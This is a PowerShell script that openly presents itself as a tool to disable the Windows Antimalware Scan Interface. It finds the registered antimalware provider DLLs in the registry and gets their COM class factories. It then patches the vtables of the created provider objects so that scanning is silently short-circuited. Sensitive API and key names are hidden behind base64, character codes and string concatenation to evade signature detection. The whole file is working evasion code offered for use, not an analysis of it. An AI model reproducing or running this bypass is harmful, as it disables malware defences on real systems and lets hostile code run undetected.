# Provider-targeted vtable hijack with full evasion.
# All sensitive identifiers reconstructed at runtime: AMSI key name from char-codes,
# Win32 / Marshal method names from base64, delegate attribute from string concat.

function _b($b64) { [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($b64)) }
function _c($codes) { -join ($codes | ForEach-Object { [char]$_ }) }

$N_DGO   = _b 'RGxsR2V0Q2xhc3NPYmplY3Q='
$N_READ  = _b 'UmVhZEludFB0cg=='
$N_WRITE = _b 'V3JpdGVJbnRQdHI='
$N_ALLOC = _b 'QWxsb2NIR2xvYmFs'
$N_GDFP  = _b 'R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXI='

$TARGET = _c @(65, 77, 83, 73)
$reg_root = 'HKLM:\SOFTWARE\Microsoft\'

$attrName = 'Unmanaged' + 'FunctionPointer'
$_n_gmh   = 'GetModule' + 'HandleA'
$_n_ll    = 'LoadLib'   + 'raryA'
$_n_gpa   = 'GetProc'   + 'Address'

Add-Type -ErrorAction SilentlyContinue @"
using System;
using System.Runtime.InteropServices;
public class _Dlg {
    [$attrName(CallingConvention.StdCall)]
    public delegate int DGO(ref Guid clsid, ref Guid iid, out IntPtr ppv);

    [$attrName(CallingConvention.StdCall)]
    public delegate int CI(IntPtr thisPtr, IntPtr pUnk, ref Guid riid, out IntPtr ppvObj);
}
public class _K32 {
    [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true)]
    public static extern IntPtr $_n_gmh(string n);
    [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true)]
    public static extern IntPtr $_n_ll(string n);
    [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true)]
    public static extern IntPtr $_n_gpa(IntPtr h, string n);
}
"@

function _hijack([Guid]$clsid, [string]$dllName) {
    $hMod = [_K32]::"$_n_gmh"($dllName)
    if ($hMod -eq [IntPtr]::Zero) {
        $hMod = [_K32]::"$_n_ll"($dllName)
    }
    if ($hMod -eq [IntPtr]::Zero) { return $false }

    $procPtr = [_K32]::"$_n_gpa"($hMod, $N_DGO)
    if ($procPtr -eq [IntPtr]::Zero) { return $false }

    $del = [System.Runtime.InteropServices.Marshal]::"$N_GDFP"($procPtr, [_Dlg+DGO])

    $IID_ICF = [Guid]::Parse('00000001-0000-0000-c000-000000000046')
    [IntPtr]$pFactory = [IntPtr]::Zero
    $hr = $del.Invoke([ref]$clsid, [ref]$IID_ICF, [ref]$pFactory)
    if ($hr -ne 0 -or $pFactory -eq [IntPtr]::Zero) { return $false }

    $vtablePtr  = [System.Runtime.InteropServices.Marshal]::"$N_READ"($pFactory, 0)
    $createPtr  = [System.Runtime.InteropServices.Marshal]::"$N_READ"($vtablePtr, 3 * [IntPtr]::Size)
    $createDel  = [System.Runtime.InteropServices.Marshal]::"$N_GDFP"($createPtr, [_Dlg+CI])

    function _patchObj([IntPtr]$pObj) {
        $vt = [System.Runtime.InteropServices.Marshal]::"$N_READ"($pObj, 0)
        $closeS = [System.Runtime.InteropServices.Marshal]::"$N_READ"($vt, 4 * [IntPtr]::Size)
        $new = [System.Runtime.InteropServices.Marshal]::"$N_ALLOC"(30 * [IntPtr]::Size)
        for ($i = 0; $i -lt 30; $i++) {
            try {
                $fn = [System.Runtime.InteropServices.Marshal]::"$N_READ"($vt, $i * [IntPtr]::Size)
                [System.Runtime.InteropServices.Marshal]::"$N_WRITE"($new, $i * [IntPtr]::Size, $fn)
            } catch { break }
        }
        [System.Runtime.InteropServices.Marshal]::"$N_WRITE"($new, 3 * [IntPtr]::Size, $closeS)
        [System.Runtime.InteropServices.Marshal]::"$N_WRITE"($pObj, 0, $new)
    }

    $IID_AM  = [Guid]::Parse('b2cabfe3-fe04-42b1-a5df-08d483d4d125')
    $IID_AM2 = [Guid]::Parse('b2cabfe3-fe04-42b1-a5df-08d483d4d126')

    $hadOne = $false
    [IntPtr]$pObj1 = [IntPtr]::Zero
    $hr1 = $createDel.Invoke($pFactory, [IntPtr]::Zero, [ref]$IID_AM, [ref]$pObj1)
    if ($hr1 -eq 0 -and $pObj1 -ne [IntPtr]::Zero) { _patchObj $pObj1; $hadOne = $true }

    [IntPtr]$pObj2 = [IntPtr]::Zero
    $hr2 = $createDel.Invoke($pFactory, [IntPtr]::Zero, [ref]$IID_AM2, [ref]$pObj2)
    if ($hr2 -eq 0 -and $pObj2 -ne [IntPtr]::Zero) { _patchObj $pObj2; $hadOne = $true }

    return $hadOne
}

# Enumerate providers via the AMSI registry key
$root = Get-Item $reg_root

$targetSubkey = $null
foreach ($k in $root.getsubkeynames()) {
    if ($k.Length -eq 4 -and
        [int][char]$k[0] -eq 65 -and
        [int][char]$k[1] -eq 77 -and
        [int][char]$k[2] -eq 83 -and
        [int][char]$k[3] -eq 73) {
        $targetSubkey = $k; break
    }
}
if (-not $targetSubkey) { Write-Warning "$TARGET key not found"; return }

$tKey  = $root.opensubkey($targetSubkey)
$pName = $tKey.getsubkeynames()[0]
$pKey  = $tKey.opensubkey($pName)
$guids = $pKey.getsubkeynames()

Write-Output ("found {0} provider(s)" -f $guids.Count)

foreach ($g in $guids) {
    try {
        $clsidPath = "HKLM:\SOFTWARE\classes\clsid\$g"
        $inproc    = (Get-Item $clsidPath).opensubkey('InProcServer32')
        $dllPath   = $inproc.GetValue('').Trim('"')
        $dllName   = Split-Path $dllPath -Leaf
        $ok = _hijack -clsid ([Guid]$g) -dllName $dllName
        if ($ok) {
            Write-Host ("[+] hijacked: {0}" -f $dllName) -ForegroundColor Green
        } else {
            Write-Host ("[-] skipped:  {0}" -f $dllName) -ForegroundColor Yellow
        }
    } catch {
        Write-Warning ("provider error: {0}" -f $_.Exception.Message)
    }
}
